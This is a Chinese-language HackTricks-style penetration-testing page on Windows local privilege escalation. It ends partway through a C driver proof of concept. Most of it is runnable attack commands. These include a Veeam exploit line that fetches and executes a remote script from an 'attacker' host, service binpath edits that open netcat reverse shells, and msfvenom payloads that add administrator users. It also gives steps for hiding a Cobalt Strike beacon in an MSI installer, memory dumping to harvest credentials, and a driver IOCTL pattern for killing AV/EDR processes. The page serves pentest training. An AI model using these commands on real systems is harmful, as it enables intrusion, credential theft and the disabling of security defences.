# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows local privilege escalation vectors 的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初始 Windows 理论

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**查看以下页面以获取有关 ACLs - DACLs/SACLs/ACEs 的更多信息：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels 是什么，你应该在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中存在多种可能会阻止你枚举系统、运行可执行文件或甚至检测到你活动的机制。你应该在开始 privilege escalation 枚举之前，阅读以下页面并枚举所有这些防御机制：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

当绕过 AppInfo 的 secure-path 检查时，通过 `RAiLaunchAdminProcess` 启动的 UIAccess 进程可被滥用以在无提示的情况下达到 High IL。请在此处查看专门的 UIAccess/Admin Protection bypass 工作流程：


{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## 系统信息

### 版本信息枚举

检查 Windows 版本是否存在任何已知漏洞（也检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞利用

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **巨大的攻击面** that a Windows environment presents.

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 内嵌 watson)_

**本地（带系统信息）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github 漏洞利用仓库：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

是否有凭证/敏感信息保存在环境变量中？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用它。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 管道执行的详细信息会被记录，包括已执行的命令、命令调用以及脚本的部分内容。不过，完整的执行细节和输出结果可能不会被完整捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明操作，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看来自 Powershell 日志的最近 15 条事件，您可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

捕获脚本执行的完整活动和全文内容记录，确保每个代码块在运行时都被记录。此过程保留了每项活动的全面审计轨迹，对于取证和分析恶意行为非常有价值。通过在执行时记录所有活动，可以提供关于该过程的详细洞见。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可在 Windows 事件查看器中通过以下路径找到： **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
要查看最近的 20 条事件，可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新请求不是通过 http**S** 而是通过 http 发出，则可以攻破系统。

首先，在 cmd 中运行以下命令来检查网络是否使用非 SSL WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中使用以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 或 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 等于 `1`。

那么，**它是可利用的。** 如果最后一个注册表值等于 `0`，则 WSUS 条目将被忽略。

为了利用此漏洞，你可以使用类似工具： [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — 这些是 MiTM 武器化利用脚本，用于向非-SSL WSUS 流量注入“fake”更新。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本上，该漏洞利用的缺陷是：

> 如果我们有权限修改本地用户的代理设置，并且 Windows Updates 使用 Internet Explorer 设置中配置的代理，那么我们就有能力在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截自身流量，并以提升权限的用户身份在资产上运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它也会使用当前用户的证书存储。如果我们为 WSUS 主机名生成一个自签名证书并将该证书添加到当前用户的证书存储中，我们将能够拦截 HTTP 和 HTTPS 的 WSUS 流量。WSUS 不使用类似 HSTS 的机制来对证书实施首次使用信任（trust-on-first-use）类型的验证。如果呈现的证书被用户信任并且具有正确的主机名，服务将接受该证书。

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（一旦发布）来利用此漏洞。

## 第三方自动更新程序和 Agent IPC (local privesc)

许多企业 agent 会暴露一个 localhost IPC 面和一个有特权的更新通道。如果能将 enrollment 强制到攻击者服务器，并且更新程序信任恶意根 CA 或签名检查薄弱，本地用户就可以传递一个恶意 MSI，由 SYSTEM 服务安装。有关通用技术（基于 Netskope stAgentSvc chain – CVE-2025-0309），见：


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` 在本地暴露了一个监听 **TCP/9401** 的服务，该服务处理攻击者控制的消息，允许以 **NT AUTHORITY\SYSTEM** 执行任意命令。

- **Recon**: 确认监听和版本，例如，`netstat -ano | findstr 9401` 和 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 将 PoC（例如 `VeeamHax.exe`）与所需的 Veeam DLL 放在同一目录，然后通过本地 socket 触发 SYSTEM 有效载荷：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
该服务以 SYSTEM 身份执行命令。

## KrbRelayUp

在 Windows **domain** 环境中，在特定条件下存在一个 **local privilege escalation** 漏洞。 这些条件包括 **LDAP signing is not enforced,** 的环境、用户拥有允许其配置 **Resource-Based Constrained Delegation (RBCD)** 的自身权限，以及用户能够在 **domain** 中创建计算机的能力。值得注意的是，这些 **要求** 在 **默认设置** 下即可满足。

在以下位置可以找到该 **exploit**： [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**如果** 这两个注册表项被 **启用**（数值为 **0x1**），则任意权限的用户可以 **安装**（执行）`*.msi` 文件为 NT AUTHORITY\\**SYSTEM**。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化此技术。

### PowerUP

使用 power-up 的 `Write-UserAddMSI` 命令在当前目录创建一个 Windows MSI 二进制文件以 escalate privileges。该脚本写出一个预编译的 MSI 安装程序，会提示进行 user/group addition（所以你将需要 GIU access）：
```
Write-UserAddMSI
```
只需执行所创建的二进制文件即可提升权限。

### MSI Wrapper

阅读此教程以了解如何使用这些工具创建 MSI wrapper。注意，如果您只是想**执行****命令行**，可以封装一个 "**.bat**" 文件。

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，在搜索框输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 给项目命名，例如 **AlwaysPrivesc**，使用 **`C:\privesc`** 作为位置，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 不断点击 **Next** 直到到达第 3 步（4 步中的选择要包含的文件）。点击 **Add** 并选择刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，并在 **Properties** 中将 **TargetPlatform** 从 **x86** 更改为 **x64**。
- 你还可以更改其他属性，如 **Author** 和 **Manufacturer**，这能让已安装的应用看起来更可信。
- 右键项目，选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保安装程序运行时立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- Finally, **build it**。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI Installation

要在后台执行该恶意 `.msi` 文件的 **安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞你可以使用: _exploit/windows/local/always_install_elevated_

## 防病毒与检测器

### 审计设置

这些设置决定了哪些内容会被**记录**，所以你应该注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，了解日志被发送到哪里很有趣
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 旨在用于 **管理本地 Administrator 密码**，确保在加入域的计算机上每个密码都是 **唯一、随机化且定期更新**。这些密码被安全地存储在 Active Directory 中，只有通过 ACLs 授予足够权限的用户才能访问，从而在被授权时查看本地 admin 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service).\
[**关于 WDigest 的更多信息请见本页**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

从 **Windows 8.1** 开始，Microsoft 为 Local Security Authority (LSA) 引入了增强保护，以 **阻止** 未受信任进程 **读取其内存** 或注入代码的尝试，从而进一步增强系统安全。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 首次在 **Windows 10** 中引入。其目的是保护设备上存储的凭据免受诸如 pass-the-hash 攻击之类的威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 缓存的凭据

**域凭据** 由 **本地安全机构** (LSA) 验证并被操作系统组件使用。 当用户的 logon 数据被注册的安全包验证时，通常会为该用户建立域凭据。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查自己所属的任何组是否具有值得注意的权限。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你**属于某个特权组，你可能能够提权**。在这里了解特权组以及如何滥用它们来提权：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**了解更多** 关于什么是 **token** 的信息请见本页： [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
查看以下页面以**了解有趣的 token**以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板的内容
```bash
powershell -command "Get-Clipboard"
```
## 正在运行的进程

### 文件和文件夹权限

首先，列出进程并**检查进程的 command line 中是否包含密码**。\
检查是否可以**覆盖某个正在运行的 binary**，或是否对 binary 文件夹具有写权限，以利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否有可能的 [**electron/cef/chromium debuggers** 正在运行，你可以滥用它来提升权限](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存密码挖掘

你可以使用 sysinternals 的 **procdump** 对正在运行的进程创建内存转储。像 FTP 这样的服务会在内存中保存 **credentials 以明文形式**，尝试转储内存并读取这些 credentials。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用可能允许用户启动 CMD 或浏览目录。**

示例： "Windows Help and Support" (Windows + F1)，搜索 "command prompt"，点击 "Click to open Command Prompt"

## 服务

Service Triggers 允许 Windows 在某些条件发生时启动服务（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh 等）。即使没有 SERVICE_START 权限，你通常也可以通过触发这些 triggers 来启动有特权的服务。枚举和激活技术见：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 来获取服务的信息
```bash
sc qc <service_name>
```
建议安装来自 _Sysinternals_ 的二进制文件 **accesschk**，以检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到此错误（例如 SSDPSRV）：

_系统错误 1058 已发生。_\
_无法启动该服务，因为它已被禁用或因为没有与其关联的已启用设备。_

你可以使用以下命令启用它
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意服务 upnphost 依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**另一个解决此问题的变通方法是运行：**
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在“Authenticated users”组对某个服务拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
可以通过多种权限实现提权：

- **SERVICE_CHANGE_CONFIG**: 允许重新配置服务二进制文件。
- **WRITE_DAC**: 允许重新配置权限，从而能够更改服务配置。
- **WRITE_OWNER**: 允许取得所有权并重新配置权限。
- **GENERIC_WRITE**: 继承了更改服务配置的能力。
- **GENERIC_ALL**: 也继承了更改服务配置的能力。

为了检测和利用该漏洞，可以使用 _exploit/windows/local/service_permissions_。

### 服务二进制文件的弱权限

**检查是否可以修改由服务执行的二进制文件** 或者你是否对二进制所在的文件夹拥有 **写权限** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
你可以使用 **wmic** 获取服务执行的所有二进制文件（不在 system32 中）并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

你应该检查是否可以修改任何服务注册表。\
你可以通过以下操作**检查**你对服务**注册表**的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务所执行的二进制文件可以被更改。

要更改所执行二进制文件的路径：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

如果你对某个注册表拥有此权限，这意味着**你可以从该注册表创建子注册表**。在 Windows 服务 的情况下，这**足以执行任意代码：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

如果可执行文件的路径没有加引号，Windows 会尝试执行路径中每个空格前的部分。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 会尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径，排除属于内置 Windows 服务的那些：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以检测并利用** 此漏洞 使用 metasploit: `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建服务二进制文件：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定当服务失败时要执行的动作。此功能可以配置为指向一个 binary。如果该 binary 可以被替换，可能会发生 privilege escalation。更多细节请参见 [官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## 应用程序

### 已安装的应用程序

检查 **binaries 的权限**（也许你可以覆盖其中一个并 escalate privileges）以及 **文件夹** 的权限（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些配置文件以读取某些特殊文件，或者是否可以修改将由 Administrator 帐户执行的某个二进制文件（schedtasks）。

查找系统中权限薄弱的文件夹/文件的一种方法是：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ 插件自动加载 持久化/执行

Notepad++ 会自动加载其 `plugins` 子文件夹下的任何 plugin DLL。如果存在可写的便携/复制安装，将恶意插件放入会在每次启动时在 `notepad++.exe` 内触发自动代码执行（包括来自 `DllMain` 和 plugin callbacks）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 启动时运行

**检查是否可以覆盖将由不同用户执行的某些注册表项或二进制文件。**\
**阅读** 以下页面以了解更多关于有趣的 **autoruns locations to escalate privileges**：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 驱动程序

查找可能的 **第三方 异常/存在漏洞的** 驱动程序
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果驱动暴露了 arbitrary kernel read/write primitive（常见于设计不良的 IOCTL handlers），你可以通过 stealing a SYSTEM token 直接从内核内存提升权限。分步技术见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

对于那些易受 race-condition 影响且易受攻击的调用会打开攻击者可控的 Object Manager 路径的漏洞，有意放慢查找（使用最大长度组件或深目录链）可以将窗口从数微秒延长到数十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive 内存破坏 primitives

现代 hive 漏洞允许你构造确定性的布局、滥用可写的 HKLM/HKU 子项，并将元数据损坏转换为内核 paged-pool 溢出而无需自定义驱动。完整攻击链见：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 滥用 device objects 上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些签名的第三方驱动通过 IoCreateDeviceSecure 使用强 SDDL 创建它们的 device object，但忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有这个标志，如果通过包含额外组件的路径打开设备时，安全 DACL 将不会被强制执行，从而允许任何非特权用户通过使用如下命名空间路径获得句柄：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

一旦用户能打开该设备，驱动暴露的特权 IOCTLs 就可被滥用用于 LPE 和 篡改。野外观察到的示例能力包括：
- 返回对任意进程的全访问句柄（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 不受限制的 raw disk 读/写（离线篡改、引导时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许从用户态通过内核实现 AV/EDR kill。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
